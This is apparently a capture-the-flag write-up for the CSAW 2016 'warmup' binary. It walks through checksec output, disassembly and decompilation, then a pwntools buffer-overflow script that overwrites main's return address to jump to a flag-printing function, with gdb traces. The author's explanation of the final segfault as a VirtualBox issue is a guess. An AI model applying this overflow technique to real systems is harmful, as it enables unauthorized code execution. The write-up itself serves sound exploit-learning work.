# Csaw16 Warmup

When I first launched the binary I could some text printed out to the terminal with what looks like an address from the binary, then a prompt for input. At the prompt I typed the address we saw printed to the screen:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Warmup$ ./warmup
-Warm Up-
WOW:0x40060d
>0x40060d
```

The program exits after my input. I want to check the build of the binary and security features: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Warmup$ file warmup && checksec warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/CallFunction/Warmup/warmup'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

So there is no PIE or canary, but NX is enabled. This will mean we can write to the stack but not execute shellcode if we find a vuln.  At this point I want to see the disassembly of main:

```bash
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040061d <+0>:	push   rbp
   0x000000000040061e <+1>:	mov    rbp,rsp
   0x0000000000400621 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:	mov    edx,0xa
   0x000000000040062a <+13>:	mov    esi,0x400741
   0x000000000040062f <+18>:	mov    edi,0x1
   0x0000000000400634 <+23>:	call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:	mov    edx,0x4
   0x000000000040063e <+33>:	mov    esi,0x40074c
   0x0000000000400643 <+38>:	mov    edi,0x1
   0x0000000000400648 <+43>:	call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:	lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:	mov    edx,0x40060d
   0x0000000000400656 <+57>:	mov    esi,0x400751
   0x000000000040065b <+62>:	mov    rdi,rax
   0x000000000040065e <+65>:	mov    eax,0x0
   0x0000000000400663 <+70>:	call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:	lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:	mov    edx,0x9
   0x0000000000400671 <+84>:	mov    rsi,rax
   0x0000000000400674 <+87>:	mov    edi,0x1
   0x0000000000400679 <+92>:	call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:	mov    edx,0x1
   0x0000000000400683 <+102>:	mov    esi,0x400755
   0x0000000000400688 <+107>:	mov    edi,0x1
   0x000000000040068d <+112>:	call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:	lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:	mov    rdi,rax
   0x0000000000400699 <+124>:	mov    eax,0x0
   0x000000000040069e <+129>:	call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:	leave
   0x00000000004006a4 <+135>:	ret
End of assembler dump.

```

# RE

We can see 3 standard C functions being used here, `write`, `sprintf`, and `gets`. The gets function does not enforce a size the function will read up to, meaning we can overflow the buffer that is passed to gets. At a high level the program does the following: 

- Writes 10 bytes of data from 0x400741 to fd 1 (STDOUT). Write has 3 args: 1st is the fd which is 0x1 here. The 2nd arg is the buffer (0x400741). The 3rd is the number of bytes to write (0xa).
- We see another call to write to STDOUT with a buffer of 0x40074c and a size of 4 bytes.
- There is a call to sprintf with a with data (pointer) from rbp-0x80.
- The data in rbp-0x80 is passed to `write` after the call to printf, and this time writes 9 bytes. 
- Another call to write is made with a buffer of 0x400755 and size of 1 byte. 
- Finally a call to gets is made with the byte stored on the stack at rbp-0x40

Let's cross check this with ghidra: 

```c
void main(void)

{
  char local_88 [64];
  char local_48 [64];

  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}

```

This is intersting, it looks like the 2nd and 3rd args to sprintf is a format string to print the pointer (or address of) easy.  When we look at the function for easy in ghidra we see:

```c
void easy(void)

{
  system("cat flag.txt");
  return;
}

```

So we can see the address that gets printed to the screen must point to the function easy. Given the fact that our input is further down in the stack frame at rbp-0x40, we probably won't be able to affect other data above us in the frame, however, because there's no stack canary, we could overwrite the return address of `main` with the address of `easy`. This should allow us to print the flag. The buffer we will write to holds 64 bytes (0x40), and that it is located at rbp-0x40. So using this knowledge, if we send 64 bytes that will take up to rbp, and if we send another 8 bytes it will overwrite rbp and put us at the return address of `main`.  To test the theory we can we send 64 A's to the program appended with 8 * B's, then append it with the address of `easy` (0x40060d). I'll script the logic in python and then debug the execution in gdb with a breakpoint on the call to easy:

```python
from pwn import *

target = process("./warmup")

gdb.attach(target, gdbscript="b *easy")

payload = b"A" * 64 + b"B"*8 + p64(0x40060d)

target.sendline(payload)

target.interactive()

```

```bash
gef➤  x/18gx $rsp
0x7ffce5ad6c40:	0x6430363030347830	0x000000000000000a
0x7ffce5ad6c50:	0x0000000000000000	0x0000000000000000
0x7ffce5ad6c60:	0x0000000000000000	0x0000000000000000
0x7ffce5ad6c70:	0x0000000000000000	0x0000000000000000
0x7ffce5ad6c80:	0x4141414141414141	0x4141414141414141
0x7ffce5ad6c90:	0x4141414141414141	0x4141414141414141
0x7ffce5ad6ca0:	0x4141414141414141	0x4141414141414141
0x7ffce5ad6cb0:	0x4141414141414141	0x4141414141414141
0x7ffce5ad6cc0:	0x4242424242424242	0x000000000040060d
gef➤  info frame
Stack level 0, frame at 0x7ffce5ad6cd0:
 rip = 0x4006a3 in main; saved rip = 0x40060d
 Arglist at 0x7ffce5ad6cc0, args: 
 Locals at 0x7ffce5ad6cc0, Previous frame's sp is 0x7ffce5ad6cd0
 Saved registers:
  rbp at 0x7ffce5ad6cc0, rip at 0x7ffce5ad6cc8

```

This is good, we can see the return address is pointing to 0x40060d which should call easy. We'll step into the next intstruction: 

```bash
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400699 <main+007c>      mov    eax, 0x0
     0x40069e <main+0081>      call   0x400500 <gets@plt>
     0x4006a3 <main+0086>      leave  
 →   0x4006a4 <main+0087>      ret    
   ↳    0x40060d <easy+0000>      push   rbp
        0x40060e <easy+0001>      mov    rbp, rsp
        0x400611 <easy+0004>      mov    edi, 0x400734
        0x400616 <easy+0009>      call   0x4004d0 <system@plt>
        0x40061b <easy+000e>      pop    rbp
        0x40061c <easy+000f>      ret    

```

We can see the next instruction will start the easy function and call system. We'll step into the call with `nexti`:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffce5ad6c80  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x0               
$rcx   : 0x000072f5e901aaa0  →  0x00000000fbad2088
$rdx   : 0x1               
$rsp   : 0x00007ffce5ad6cc8  →  "BBBBBBBB"
$rbp   : 0x00007ffce5ad6cc8  →  "BBBBBBBB"
$rsi   : 0x1               
$rdi   : 0x0000000000400734  →  "cat flag.txt"
$rip   : 0x0000000000400616  →  <easy+0009> call 0x4004d0 <system@plt>
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x77              
$r11   : 0x246             
$r12   : 0x00007ffce5ad6dd8  →  0x00007ffce5ad840c  →  "./warmup"
$r13   : 0x000000000040061d  →  <main+0000> push rbp
$r14   : 0x0               
$r15   : 0x000072f5e925c040  →  0x000072f5e925d2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffce5ad6cc8│+0x0000: "BBBBBBBB"	 ← $rsp, $rbp
0x00007ffce5ad6cd0│+0x0008: 0x0000000000000000
0x00007ffce5ad6cd8│+0x0010: 0x000000000040061d  →  <main+0000> push rbp
0x00007ffce5ad6ce0│+0x0018: 0x0000000100000000
0x00007ffce5ad6ce8│+0x0020: 0x00007ffce5ad6dd8  →  0x00007ffce5ad840c  →  "./warmup"
0x00007ffce5ad6cf0│+0x0028: 0x0000000000000000
0x00007ffce5ad6cf8│+0x0030: 0xfc417dd59d8cac05
0x00007ffce5ad6d00│+0x0038: 0x00007ffce5ad6dd8  →  0x00007ffce5ad840c  →  "./warmup"
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40060d <easy+0000>      push   rbp
     0x40060e <easy+0001>      mov    rbp, rsp
     0x400611 <easy+0004>      mov    edi, 0x400734
 →   0x400616 <easy+0009>      call   0x4004d0 <system@plt>
   ↳    0x4004d0 <system@plt+0000> jmp    QWORD PTR [rip+0x200b4a]        # 0x601020 <system@got.plt>
        0x4004d6 <system@plt+0006> push   0x1
        0x4004db <system@plt+000b> jmp    0x4004b0
        0x4004e0 <__libc_start_main@plt+0000> jmp    QWORD PTR [rip+0x200b42]        # 0x601028 <__libc_start_main@got.plt>
        0x4004e6 <__libc_start_main@plt+0006> push   0x2
        0x4004eb <__libc_start_main@plt+000b> jmp    0x4004b0
─────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000000000400734 → "cat flag.txt",
   $rsi = 0x0000000000000001,
   $rdx = 0x0000000000000001
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x400616 in easy (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400616 → easy()

```
At this point the program is about to call the system function with the *char array "cat flag.txt". Unfortunately, this did not work for me. When system is called the program segfaults. I know that this solution is the intended way to solve, so it may be a subtle issue on my system (virtualbox). I thought I'd leave this here in case someone else had the same issue.

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0000000000400734  →  "cat flag.txt"
$rcx   : 0x000072f5e901aaa0  →  0x00000000fbad2088
$rdx   : 0x1               
$rsp   : 0x00007ffce5ad6908  →  0x000072f5e901aaa0  →  0x00000000fbad2088
$rbp   : 0x00007ffce5ad6cc8  →  "BBBBBBBB"
$rsi   : 0x1               
$rdi   : 0x0000000000400734  →  "cat flag.txt"
$rip   : 0x000072f5e8e50973  →  <do_system+0073> movaps XMMWORD PTR [rsp], xmm1
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x000072f5e8e0d5a8  →  0x000f002200002ab7
$r11   : 0x000072f5e8e50d70  →  <system+0000> endbr64 
$r12   : 0x00007ffce5ad6dd8  →  0x00007ffce5ad840c  →  "./warmup"
$r13   : 0x000072f5e901c7a0  →  0x0000000000000000
$r14   : 0x000072f5e901c840  →  0x0000000000000000
$r15   : 0x000072f5e925c040  →  0x000072f5e925d2e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffce5ad6908│+0x0000: 0x000072f5e901aaa0  →  0x00000000fbad2088	 ← $rsp
0x00007ffce5ad6910│+0x0008: 0x0000000000000001
0x00007ffce5ad6918│+0x0010: 0x0000000000000001
0x00007ffce5ad6920│+0x0018: 0x00000000ffffffff
0x00007ffce5ad6928│+0x0020: 0x0000000000000000
0x00007ffce5ad6930│+0x0028: 0x0000000000000000
0x00007ffce5ad6938│+0x0030: 0x000000000000000d ("\r"?)
0x00007ffce5ad6940│+0x0038: 0x0000000000021000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x72f5e8e50950 <do_system+0050> mov    QWORD PTR [rsp+0x180], 0x1
   0x72f5e8e5095c <do_system+005c> mov    DWORD PTR [rsp+0x208], 0x0
   0x72f5e8e50967 <do_system+0067> mov    QWORD PTR [rsp+0x188], 0x0
 → 0x72f5e8e50973 <do_system+0073> movaps XMMWORD PTR [rsp], xmm1
   0x72f5e8e50977 <do_system+0077> lock   cmpxchg DWORD PTR [rip+0x1cbe01], edx        # 0x72f5e901c780 <lock>
   0x72f5e8e5097f <do_system+007f> jne    0x72f5e8e50c30 <do_system+816>
   0x72f5e8e50985 <do_system+0085> mov    eax, DWORD PTR [rip+0x1cbdf9]        # 0x72f5e901c784 <sa_refcntr>
   0x72f5e8e5098b <do_system+008b> lea    edx, [rax+0x1]
   0x72f5e8e5098e <do_system+008e> mov    DWORD PTR [rip+0x1cbdf0], edx        # 0x72f5e901c784 <sa_refcntr>
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x72f5e8e50973 in __sigemptyset (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x72f5e8e50973 → __sigemptyset(set=<optimised out>)
[#1] 0x72f5e8e50973 → do_system(line=0x400734 "cat flag.txt")
[#2] 0x40061b → easy()

```
